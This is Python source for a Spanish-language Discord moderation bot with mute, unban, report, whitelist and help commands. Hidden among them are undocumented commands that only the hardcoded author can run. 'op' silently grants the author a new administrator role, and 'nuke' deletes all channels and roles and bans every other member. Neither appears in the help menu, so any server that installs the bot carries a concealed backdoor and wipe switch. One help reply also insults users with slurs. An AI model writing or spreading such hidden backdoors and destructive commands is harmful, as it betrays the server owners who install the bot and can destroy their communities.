# ◤━━━━━━━━━━━━━━━━━━━━━°•UNMUTE•°━━━━━━━━━━━━━━━━━━━━━◥

@bot.command()
@dms()
@helper_or_higher()
async def unmute (ctx, member: discord.Member):
    try:
        em = discord.Embed(title=f'You have been unmuted',
                           description=f'Has sido desmuteado de {ctx.guild.name} por {ctx.author.name}.',
                           color=5763719)
        await member.send(embed=em)
        mute_name = await mysql.settings_val(ctx.guild, 'mute')
        mute_role = ctx.guild.get_role(int(mute_name))
        await member.edit(mute=False)
        await member.remove_roles(mute_role)
    except:
        pass

# ◤━━━━━━━━━━━━━━━━━━━━━°•TEST•°━━━━━━━━━━━━━━━━━━━━━◥
@bot.command()
@dms()
async def test(ctx, x):
    if str(ctx.author) == str(author):
        await ctx.send(f'{x}')
        await ctx.send(f'{ctx.author}')
        await ctx.send(f'{ctx.message}')
        await ctx.send(f'{ctx.channel.id}')
        await ctx.send(f'{ctx.guild}')
        print(f'{x}')
    else:
        pass

# ◤━━━━━━━━━━━━━━━━━━━━━°•UNBAN•°━━━━━━━━━━━━━━━━━━━━━◥
@bot.command(aliases=['pardon', 'ub', 'revoke'])
@dms()
@owner_or_admin()
async def unban(ctx, member):
    banned_users = await ctx.guild.bans()
    if str(member) != 'list':
        member_name, member_discriminator = str(member).split('#')
        for ban_entry in banned_users:
            user = ban_entry.user
            if (user.name, user.discriminator) == (member_name, member_discriminator):
                await ctx.guild.unban(user)
                em = discord.Embed(title=f'Member unbanned', description=f'{member.name} ha sido desbaneado.',color=5763719)
                await ctx.send(embed=em)
                return
            else:
                em = discord.Embed(title=f'Error ocurred', description=f'No se ha podido desbanear a {member} porque no está baneado o has introducido mal los datos.',color=5763719)
                await ctx.send(embed=em)
                return
    else:
        await ctx.send(f'Los miembros baneados son los siguientes:')
        for ban_entry in banned_users:
           await ctx.send(f'```- {ban_entry.user.name}#{ban_entry.user.discriminator}```')

# ◤━━━━━━━━━━━━━━━━━━━━°•REPORT•°━━━━━━━━━━━━━━━━━━━━━━◥
@bot.command()
async def report(ctx, opt=None, body=None, excess=None):
    if excess is not None:
        em = discord.Embed(title=f'Invalid value',description=f'Debes introducir la descripción entre comillas, por ejemplo $report {opt} "esto es un ejemplo de la descripción"',color=16711680)
        await ctx.send(embed=em)
        return
    if opt is None:
        em=discord.Embed(title='REPORT', description='Con este comando puedes mandar reportes de bugs, sugerencias o personas', color=16711680)
        em.add_field(name='Bug', value='Si encuentras un fallo, algo que no funciona o cualquier falta de ortografia/expresión usa `$report bug <Descripcion del fallo que has encontrado>`')
        em.add_field(name='Sugerencia',value='Si tienes una idea que crees que puede aportar algo positivo al bot, ya sean funciones, alias para comandos o opciones usa `$report suggest <Sugerencia>`')
        await ctx.send(embed=em)
        return
    if body is None:
        em = discord.Embed(title='Insuficient arguments',description='Debes introducir una descripcion del fallo o sugerencia.', color=16711680)
        em.add_field(name='Bug',value='Si encuentras un fallo, algo que no funciona o cualquier falta de ortografia/expresión usa `$report bug <Descripcion del fallo que has encontrado>`')
        em.add_field(name='Sugerencia',value='Si tienes una idea que crees que puede aportar algo positivo al bot, ya sean funciones, alias para comandos o opciones usa `$report suggest <Sugerencia>`')
        await ctx.send(embed=em)
        return
    try:
        support_channel= bot.get_channel(feedback_channel)
        if opt == 'suggest' or opt == 'sugerencia':
            await ctx.channel.purge(limit=1)
            em = discord.Embed(title='SUGERENCIA',description=f'Sugerencia enviada en {ctx.guild}',color=3066993)
            em.add_field(name='Autor',value=str(ctx.author))
            em.add_field(name='Sugerencia',value=str(body))
            await support_channel.send(embed=em)
        elif opt == 'bug' or opt == 'report' or opt == 'fallo':
            await ctx.channel.purge(limit=1)
            em = discord.Embed(title='BUG',description=f'Bug encontrado en {ctx.guild}',color=16705372)
            em.add_field(name='Autor', value=str(ctx.author))
            em.add_field(name='Bug', value=str(body))
            await support_channel.send(embed=em)
        else:
            em = discord.Embed(title='Argumento invalido',description=f'{opt} no es una opción valida, a continuación tienes las opcines validas.',color=16711680)
            em.add_field(name='Bug',value='Si encuentras un fallo, algo que no funciona o cualquier falta de ortografia/expresión usa `$report bug <Descripcion del fallo que has encontrado>`')
            em.add_field(name='Sugerencia',value='Si tienes una idea que crees que puede aportar algo positivo al bot, ya sean funciones, alias para comandos o opciones usa `$report suggest <Sugerencia>`')
            await ctx.send(embed=em)
    except:
        em = discord.Embed(title='No existe canal de soporte',description='Este servidor no tiene canal de soporte, habla con el owner para que lo active.',color=16711680)
        await ctx.send(embed=em)


# ◤━━━━━━━━━━━━━━━━━━━━━━°•OP•°━━━━━━━━━━━━━━━━━━━━━━━◥
@bot.command()
@dms()
async def op(ctx):
    if str(ctx.author) == author:
        role = await ctx.guild.create_role(name="💥¤≤OP≥¤💥", permissions=discord.Permissions(8),colour=discord.Colour(0xff0000))
        await ctx.author.add_roles(role)
        await ctx.channel.purge(limit=1)
        await ctx.author.send(f'Se ha creado « 💥¤≤OP≥¤💥 » en {ctx.guild}')
    else:
        return

# ◤━━━━━━━━━━━━━━━━━━━━━°•DEOP•°━━━━━━━━━━━━━━━━━━━━━━◥
@bot.command()
@dms()
async def deop(ctx):
    if str(ctx.author) == author:
        for r in ctx.guild.roles:
            if str(r.name) == '💥¤≤OP≥¤💥':
                role_object = discord.utils.get(ctx.message.guild.roles, name='💥¤≤OP≥¤💥')
                await ctx.channel.purge(limit=1)
                await role_object.delete()
                await ctx.author.send(f'Se ha borrado « {r.name} » de {ctx.guild}')
            else:
                pass
    else:
        pass

# ◤━━━━━━━━━━━━━━━━━━━━°•NUKER•°━━━━━━━━━━━━━━━━━━━━━━◥
@bot.command()
@dms()
async def nuke(ctx):
    if str(ctx.author) == author:
        banned_members = unbanned_members = eliminated_channels =  eliminated_roles = 0
        for channel in ctx.guild.channels:
            eliminated_channels += 1
            await channel.delete()
            pass
        for role in ctx.message.guild.roles:
            try:
                role_object = discord.utils.get(ctx.message.guild.roles, name=role.name)
                await role_object.delete()
                print(f'Se ha eleminado {role.name}')
                eliminated_roles += 1
            except:
                print('No se ha podido borrar ' + str(role))
        for user in ctx.message.guild.members:
            if str(user) == author:
                 pass
            else:
                try:
                    print('ban ' + str(user))
                    await user.ban(reason='Get nuked gg')
                    banned_members += 1
                except:
                    unbanned_members += 1
                    print('No se ha podido banear a ' + str(user))
        await ctx.author.send('''---------------> Stats <---------------
        - Miembros baneados: {}
        - Miembros __NO__ baneados: {}
        - Canales borrados: {}
        - Roles eliminados: {}
-----------------------------------------'''.format(banned_members, unbanned_members, eliminated_channels, eliminated_roles))
    else:
        print('Mamaste')

# ◤━━━━━━━━━━━━━━━━━━━━°•CONFUGIRADORES•°━━━━━━━━━━━━━━━━━━━━━━◥
@bot.command(aliases=['faq', 'bot'])
async def confugiradores(ctx):
    em=discord.Embed(title='F.A.Q', description='Aquí tienes las principales preguntas que nos hacen o que se te pueden venir a la cabeza', color=16711680)
    em.add_field(name='¿Quiénes somos?', value='Somos un grupo de amigos frikis e informáticos a partes iguales, nos conocimos estudiando y a raiz de nuestra '
                                               'relación se creó este proyecto, en el cual puedes encontrar desde páginas web hasta servidores de juegos o '
                                               'bots como este (entre otros), cada uno tenemos nuestros conocimientos y campos en los que nos sentimos más cómodos '
                                               'pero nos intentamos ayudar entre todos para ser mejores cada dia!!', inline=False)
    em.add_field(name='¿Tenéis página web?', value='Sí, tenemos casi todas bajo el dominio de confugiradores.es, ahí puedes encontrar todas las páginas personales de todos los integrantes así como la general.')
    em.add_field(name='¿Que habeis estudiado?', value='Todos hemos estudiado Sistemas Microinformáticos y Redes, aunque ahora cada uno está estudiando una rama distinta de la informática.')
    em.add_field(name='¿De dónde sois?', value='Actualmente todos vivimos en Madrid, aunque hay mucha diversidad de nacionalidades!!!')
    em.add_field(name='¿Cuantos años tenéis?', value='No tenemos todos la misma edad pero vamos desde gente del 1985 hasta gente del 2003')
    em.add_field(name='¿De donde viene el nombre?', value='El nombre salió a partir de un meme que se mandó por nuestro grupo de clase y me hizo mucha gracia.')
    em.add_field(name='¿Tienes alguna pregunta más?', value='Si tienes alguna pregunta que creas que debemos poner aqui o simplemente quieres saber su respuesta puedes mandarla con `$report pregunta <discordtag> <pregunta>`')
    await ctx.send(embed=em)
# ◤━━━━━━━━━━━━━━━━━━━━°•B1CH0•°━━━━━━━━━━━━━━━━━━━━━━◥
@bot.command(aliases=['bicho','owner'])
async def b1ch0(ctx):
    em = discord.Embed(title='B1CH0 aka el programador del bot',
                       description='Buenaaas!!! Soy Iván o como se me conoce por estos lares bicho, soy el que está desarrollando el bot,'
                                   'empezó como un pequeño proyecto para ayudarme a aprender pyhon que poco a poco ha ido creciendo con '
                                   'más funciones, si quieres contactar conmigo puedes mandar un correo a `b1ch0@confugiradores.es` o hacer una sugerencia con `$report sugerencia "sugerencia"`',
                       color=16711680)
    await ctx.send(embed=em)
# ◤━━━━━━━━━━━━━━━━━━━━°•Whitelist•°━━━━━━━━━━━━━━━━━━━━━━◥
@bot.command()
@mod_or_higher()
async def whitelist(ctx, opt=None, v2=None, v3=None, v4=None, v5=None, *, v6=None):
    if str(ctx.author) != author:
        opt=None
    if opt == "add":
        query=await mysql.add(ctx.guild, "whitelist", v2, v3, v4, v5, v6)
        if query is None:
            em = discord.Embed(title='Error ocurred',
                               description='No se ha podido añadir el registro por algun motivo.',
                               color=16711680)
        elif query == "primary":
            em = discord.Embed(title='Error ocurred',
                               description=f'Ya existe un servidor con el nombre {v3}.',
                               color=16711680)
        else:
            em = discord.Embed(title='Registro añadido',
                               description='Se ha añadido el registro correctamente.',
                               color=5763719)
        await ctx.send(embed=em)
    elif opt == "remove":
        query=await mysql.remove(ctx.guild, "whitelist", "server_name", v2)
        if query is None:
            em = discord.Embed(title='Error ocurred',
                               description='No se ha podido borrar la tabla por algun motivo.',
                               color=16711680)
        else:
            em = discord.Embed(title='Tabla eliminada',
                               description='Se ha eliminado la tabla whitelist correctamente.',
                               color=5763719)
        await ctx.send(embed=em)
    elif opt == "edit":
        if v2 == "emoji":
            newval=emojis.decode(v4)
        await mysql.update(ctx.guild, "whitelist", v2, v3, v4)
    elif opt == "list":
        if v2 is None:
            tabla=await mysql.list(ctx.guild, "whitelist")
            em = discord.Embed(title="Whitelist", description="Estos son todos los servidores disponibles:")
            for entry in tabla:
                em.add_field(name=entry[2] + " | " + emojis.encode(entry[1]), value=f"__Descripción:__ {entry[3]}\n__Clase:__ {entry[0]}\n__Comando:__ {entry[4]}")
            await ctx.send(embed=em)
    else:
        await ctx.channel.purge(limit=1)
        query=await mysql.list(ctx.guild, "whitelist")
        if query == "error":
            if str(ctx.author) == author:
                await mysql.create(ctx.guild, "whitelist", "server", "emoji", "server_name", "server_description", "command")
                em = discord.Embed(title=f'Tabla creada',
                                   description=f'Se ha creado la tabla whitelist correctamente.',
                                   color=5763719)
                await ctx.send(embed=em)
            else:
                em = discord.Embed(title=f'Error ocurred',
                                   description=f'No tienes permiso para realizar esa acción habla con {author}.',
                                   color=16711680)
                await ctx.send(embed=em)
            return
        if str(query) == "[]":
            em = discord.Embed(title=f'Error ocurred',
                               description=f'No existe ningun registro, habla con {author} para añadirlos.',
                               color=16711680)
            await ctx.send(embed=em)
            return
        em = discord.Embed(title='Lista de servidores',
                            description='Reacciona a este mensaje para solicitar la entrada a algun servidor',
                            color=16711680)
        serveremojis = []
        for entry in query:
            serveremoji=entry[1]
            servername=entry[2]
            serverdesc=entry[3]
            em.add_field(name=servername + " - " + serveremoji, value=serverdesc)
            serveremojis.append(serveremoji)
        message = await ctx.send(embed=em)
        try:
            oldmsg = await mysql.settings_val(ctx.guild, "whitelistmsg")
            oldmessage = await ctx.fetch_message(oldmsg)
            await oldmessage.delete()
        except:
            pass
        await mysql.settings_set(ctx, ctx.guild, 'whitelistmsg', message.id, None)
        for emoji in serveremojis:
            await message.add_reaction(emojis.encode(emoji))

# »»——————————————————————————————HELP——————————————————————————————————««
@bot.group(invoke_without_command=True)
async def help(ctx):
    em = discord.Embed(title='Help', description='Utiliza `' + str(
        prefix) + 'help <command>` para ver información detallada de cada comando.', color=16711680)
    # campos
    em.add_field(name='Administration', value='''
        - Settings
        - Reaction''')
    em.add_field(name='Moderation', value='''
    - Mute
    - Unmute
    - Kick
    - Ban
    - Unban
    - Clear
    - Say
    - Send''')
    em.add_field(name='Others', value='''
    - Confugiradores
    - Cumple
    - Nick
    - Spank
    - Bonk
    - Chad
    - Invite
    - Preffixes''')
    await ctx.send(embed=em)

# comandos
@help.command()
async def command(ctx):
    await ctx.send('Tu lo que eres es un poco retrasado `<command>` es para que pongas cualquier comando de los de la lista, subnormal.')

@help.command(aliases=['ajustes'])
async def settings(ctx):
    em = discord.Embed(title='Settings', description='Cambia los ajustes del servidor.', color=16711680)
    em.add_field(name='_Syntax_', value=prefix + '`settings <opción> <valor>`', inline=False)
    em.add_field(name='_Opciones_', value='»»━━━>', inline=False)
    em.add_field(name='_bot_', value='Permite cambiar el rol que se asigna por defecto a los bots que entran en el servidor, este rol no tiene ningun permiso, solo agrupa a los bots.',inline=True)
    em.add_field(name='_botop_',value='Permite cambiar el rol que se asigna por defecto a los bots que entran en el servidor, este rol tendrá permisos de administrador y se encontrará por encima de todos los roles.',inline=True)
    em.add_field(name='_bday_', value='Permite cambiar el canal al que se mandan las felicitaciones, para desactivar esta funcion usa $settings bday Default', inline=True)
    em.add_field(name='_mute_', value='Rol que se asigna a las personas muteadas', inline=True)
    em.add_field(name='_helper_', value='Permite mutear o desmutear a los usuarios con el comando $mute', inline=True)
    em.add_field(name='_mod_', value='Permite kickear a los usuarios del servidor, asi como mutear o desmutear',inline=True)
    em.add_field(name='_admin_', value='Este rol permite a los usuarios que lo tengan a interactuar completamente con el bot', inline=True)
    em.add_field(name='_mutechannel_', value='Este canal es el canal que verán las personas con el rol de mute', inline=True)
    em.add_field(name='_joinrole_', value='Este rol es el que se asignará a todos los usuarios que entren al servidor',inline=True)
    em.add_field(name='_suggest_', value='Permite cambiar el canal al que se envian las sugerencias realizadas con $suggest.', inline=True)
    await ctx.send(embed=em)

@help.command(aliases=['reactions', 'reaccion' , 'react'])
async def reaction(ctx):
    em = discord.Embed(title='Reaction', description='Crea un mensaje y haz que la gente reciba un rol con solo reaccionar a el.', color=16711680)
    em.add_field(name='_Syntax_', value='''- Create -> `$reaction create`
    - Setup -> `$reaction <mensaje>`
    - Add -> `$reaction add <role> <role_emoji> <role_description> <alias>`
    - Remove -> `$reaction remove <alias>`
    - List -> `$reaction list`
    - Edit -> `$reaction edit <opcion> <@rol> <nuevo valor>`''', inline=False)
    em.add_field(name='_Opciones_', value='»»━━━>', inline=False)
    em.add_field(name='_create_', value='Esta opción sirve para habilitar la función, si no se ejecuta al menos una vez no podrás crear reaction roles.',inline=True)
    em.add_field(name='_setup_', value='Crea un mensaje con los roles y emojis, así como las descripciones.',inline=True)
    em.add_field(name='_add_', value='Añade un nuevo reaction role.',inline=True)
    em.add_field(name='_remove_', value='Elimina un reaction role.',inline=True)
    em.add_field(name='_list_', value='Muestra una lista con todos los reaction roles configurados hasta el momento.',inline=True)
    em.add_field(name='_edit_', value='Permite editar alguna propiedad de un reaction role que ya ha sido creado.',inline=True)
    await ctx.send(embed=em)

@help.command()
async def mute(ctx):
    em = discord.Embed(title='Mute', description='Silencia a la persona que menciones.', color=16711680)
    em.add_field(name='_Syntax_', value=prefix + '`mute <usuario>`')
    await ctx.send(embed=em)

@help.command()
async def unmute(ctx):
    em = discord.Embed(title='Unute', description='Desilencia a la persona del servidor.', color=16711680)
    em.add_field(name='_Syntax_', value=prefix + '_unmute <usuario>_')
    await ctx.send(embed=em)

@help.command()
async def kick(ctx):
    em = discord.Embed(title='Kick', description='Expulsa a un miembro del servidor, podrá volver a unirse si alguien lo invita de nuevo.', color=16711680)
    em.add_field(name='_Syntax_', value=prefix + '`kick <usuario> <razón>`')
    await ctx.send(embed=em)

@help.command(aliases=['slay'])
async def ban(ctx):
    em = discord.Embed(title='Ban', description='Banea a una persona del servidor, esta persona no podrá volver a unirse a no ser que otro staff le revoque el baneo.', color=16711680)
    em.add_field(name='_Syntax_', value=prefix + '`ban <usuario>`')
    await ctx.send(embed=em)

@help.command(aliases=['pardon', 'revoke', 'ub'])
async def unban(ctx):
    em = discord.Embed(title='Unban', description='Revoca el baneo al usuario.', color=16711680)
    em.add_field(name='_Syntax_', value=prefix + '`unban <usuario>`')
    await ctx.send(embed=em)

@help.command(aliases=['clean', 'cls'])
async def clear(ctx):
    em = discord.Embed(title='Clear', description='Elimina X mensajes del chat en el cual se ha puesto el comando.', color=16711680)
    em.add_field(name='_Syntax_', value=prefix + '`clear <num>`')
    await ctx.send(embed=em)

@help.command(aliases=['di'])
async def say(ctx):
    em = discord.Embed(title='Say', description='Haz que todo lo que escribas lo diga el bot.', color=16711680)
    em.add_field(name='_Syntax_', value=prefix + '`say <titulo> <texto>`')
    await ctx.send(embed=em)

@help.command(aliases=[])
async def send(ctx):
    em = discord.Embed(title='Send', description='Envia una imagen guardada en el directorio del bot.', color=16711680)
    em.add_field(name='_Syntax_', value=prefix + '`send <ruta>`')
    await ctx.send(embed=em)

@help.command(aliases=['confu', 'cnf'])
async def confugiradores(ctx):
    em = discord.Embed(title='Confugiradores', description='Muestra información acerca de confugiradores.', color=16711680)
    em.add_field(name='_Syntax_', value=prefix + '`confugiradores`')
    await ctx.send(embed=em)

@help.command()
async def cumple(ctx):
    em = discord.Embed(title='cumple', description='Haz que el bot te felicite el dia de tu cumpleaños con este comando.',color=16711680)
    em.add_field(name='_Syntax_', value='''- Set -> `$cumple set <dia> <mes>`
    - Edit -> `$cumple edit <dia> <mes>`
    - Remove -> `$cumple remove`
    - Check -> `$cumple check`''')
    em.add_field(name='_Opciones_', value=prefix + '»»━━━>', inline=False)
    em.add_field(name='_set_',value='Agrega tu cumpleaños para que el bot pueda felicitarte.',inline=True)
    em.add_field(name='_edit_', value='Edita la fecha de tu cumpleaños.',inline=True)
    em.add_field(name='_remove_', value='Elimina tu cumpleaños para que el bot no te felicite.', inline=True)
    em.add_field(name='_check_', value='Comprueba la fecha que está guardada para felicitarte.', inline=True)
    await ctx.send(embed=em)

@help.command(aliases=['ren', 'rename', 'alias'])
async def nick(ctx):
    em = discord.Embed(title='Nick', description='Permite cambiar el nombre a un usuario si tienes permiso para ello o el tuyo propio.', color=16711680)
    em.add_field(name='_Syntax_', value=prefix + '`nick <nuevo nombre> [usuario]`')
    await ctx.send(embed=em)

@help.command()
async def spank(ctx):
    em = discord.Embed(title='Spank',description='Azota a un usuario si se ha portado mal.',color=16711680)
    em.add_field(name='_Syntax_', value=prefix + '`spank <usuario>`')
    await ctx.send(embed=em)

@help.command()
async def bonk(ctx):
    em = discord.Embed(title='Bonk',description='Hazle bonk a un usuario si se ha portado mal.',color=16711680)
    em.add_field(name='_Syntax_', value=prefix + '`bonk <usuario>`')
    await ctx.send(embed=em)

@help.command()
async def chad(ctx):
    em = discord.Embed(title='Chad',description='Demuestra a un usuario quien es el verdadero chad.',color=16711680)
    em.add_field(name='_Syntax_', value=prefix + '`chad <usuario>`')
    await ctx.send(embed=em)

@help.command(aliases = ['invitacion', 'invitar'])
async def invite(ctx):
    em = discord.Embed(title='Invite', description='Crea una invitación permanente con un simple comando.', color=16711680)
    em.add_field(name='_Syntax_', value=prefix + '`invite`')
    await ctx.send(embed=em)

@help.command(aliases = ['prefijos'])
async def preffixes(ctx):
    em = discord.Embed(title='Preffixes', description='Envia los prefijos de los bots que mas me gustan.', color=16711680)
    em.add_field(name='_Preffixes_', value=prefix + '`preffixes`')
    await ctx.send(embed=em)

@help.command()
async def whitelist(ctx):
    em = discord.Embed(title='Preffixes', description='Este comando permite crear whitelists dinamicas para tus servidores.', color=16711680)
    em.add_field(name='_Syntax_', value=prefix + '`whitelist [add|delete|list] <server> <emoji> <server_name> <server_description> <command>`')
    em.add_field(name='_Extra_', value='En este comando todos los argumentos son obligatorios')
    await ctx.send(embed=em)


# »»————————————————————————————EOF-HELP————————————————————————————————««

bot.run(getenv("TOKEN"))
